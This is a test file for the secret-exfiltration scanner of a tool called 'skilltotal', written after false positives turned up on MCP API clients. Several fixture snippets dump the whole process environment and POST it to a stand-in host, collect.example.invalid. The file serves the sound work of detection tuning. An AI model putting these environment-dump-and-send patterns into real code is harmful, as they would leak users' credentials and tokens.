"""ST-SECRET-EXFIL: what a helper reads from the environment is not the environment.

Found on 2026-11-03 in a rescan of the MCP registry: seven API clients were rated malicious for
sending their own configured token or header to their own configured base URL.
- ``token = resolve_token(os.environ)`` marked the token, then the headers holding it, as the
  environment; ``const host = resolveHost(process.env)`` did the same for a URL.
- In Python a name was followed across the whole file: ``env = {**os.environ, ...}`` for a child
  process in one function marked ``env``, ``key``, ``body`` in every other function.
The environment handed back by a helper, or posted from the function that reads it, still fires."""

from __future__ import annotations

from pathlib import Path

from skilltotal.file_index import FileIndex
from skilltotal.scanners.secret_exfil import _js_env_dumps, _py_env_dumps


def _js(tmp_path: Path, source: str) -> list[int]:
    (tmp_path / "index.js").write_text(source, encoding="utf-8")
    return [e.line_start for f in FileIndex.build(tmp_path).files for e in _js_env_dumps(f)]


def _py(tmp_path: Path, source: str) -> list[int]:
    (tmp_path / "main.py").write_text(source, encoding="utf-8")
    return [e.line_start for f in FileIndex.build(tmp_path).files for e in _py_env_dumps(f)]


# --- Python ---------------------------------------------------------------------------------------

def test_a_token_read_by_the_files_own_helper_is_not_the_environment(tmp_path):
    source = (
        "import os, httpx\n"
        "def resolve_token(env):\n"
        "    val = (env.get('SERVICE_TOKEN') or '').strip()\n"
        "    return val or None\n"
        "def main():\n"
        "    env = os.environ\n"
        "    token = resolve_token(env)\n"
        "    headers = {'Authorization': f'Bearer {token}'}\n"
        "    httpx.Client().post('https://api.example.invalid/x', headers=headers)\n"
    )
    assert _py(tmp_path, source) == []


def test_a_name_holds_the_environment_only_in_its_own_function(tmp_path):
    source = (
        "import os, subprocess\n"
        "from urllib.request import Request, urlopen\n"
        "def run():\n"
        "    env = {**os.environ, 'PGPASSFILE': '/tmp/x'}\n"
        "    subprocess.run(['psql'], env=env)\n"
        "    body = env\n"
        "def query(env):\n"
        "    body = env.encode()\n"
        "    urlopen(Request('https://db.example.invalid/q', data=body))\n"
    )
    assert _py(tmp_path, source) == []


def test_the_environment_handed_back_by_the_files_own_helper_is_sent(tmp_path):
    source = (
        "import os, requests\n"
        "def snapshot(env):\n"
        "    data = {}\n"
        "    data['vars'] = dict(env)\n"
        "    return data\n"
        "def main():\n"
        "    payload = snapshot(os.environ)\n"
        "    requests.post('https://collect.example.invalid/r', json=payload)\n"
    )
    assert _py(tmp_path, source) == [8]


def test_a_helper_that_returns_the_environment_it_reads_is_sent(tmp_path):
    source = (
        "import os, requests\n"
        "def grab():\n"
        "    return dict(os.environ)\n"
        "requests.post('https://collect.example.invalid/r', json=grab())\n"
    )
    assert _py(tmp_path, source) == [4]


def test_the_environment_given_to_an_imported_helper_still_counts(tmp_path):
    # The helper's body is not in the file: what it returns may be the environment.
    source = (
        "import os, requests\n"
        "from .util import pack\n"
        "data = pack(os.environ)\n"
        "requests.post('https://collect.example.invalid/r', data=data)\n"
    )
    assert _py(tmp_path, source) == [4]


def test_a_module_level_copy_is_still_sent_from_a_function(tmp_path):
    source = (
        "import os, requests\n"
        "SNAP = dict(os.environ)\n"
        "def send():\n"
        "    requests.post('https://collect.example.invalid/r', json=SNAP)\n"
    )
    assert _py(tmp_path, source) == [4]


# --- JavaScript -----------------------------------------------------------------------------------

def test_a_host_read_by_an_imported_helper_is_not_the_environment(tmp_path):
    source = (
        "import { resolveHost, resolveContext, hostHeaders } from './config.js';\n"
        "const host = resolveHost(process.env);\n"
        "const ctx = resolveContext({ argv: process.argv, env: process.env });\n"
        "const base = `http://${host}:8080`;\n"
        "export async function tools(key) {\n"
        "  return fetch(`${base}/mcp/tools`, { headers: hostHeaders(key, ctx) });\n"
        "}\n"
    )
    assert _js(tmp_path, source) == []


def test_the_environment_given_to_the_files_own_helper_still_counts(tmp_path):
    source = (
        "function pack(e) { return btoa(JSON.stringify(e)); }\n"
        "const data = pack(process.env);\n"
        "fetch('https://collect.example.invalid/r', { method: 'POST', body: data });\n"
    )
    assert _js(tmp_path, source) == [3]


def test_the_environment_put_into_an_encoded_object_is_still_sent(tmp_path):
    source = (
        "const data = JSON.stringify({ env: process.env });\n"
        "fetch('https://collect.example.invalid/r', { method: 'POST', body: data });\n"
    )
    assert _js(tmp_path, source) == [2]
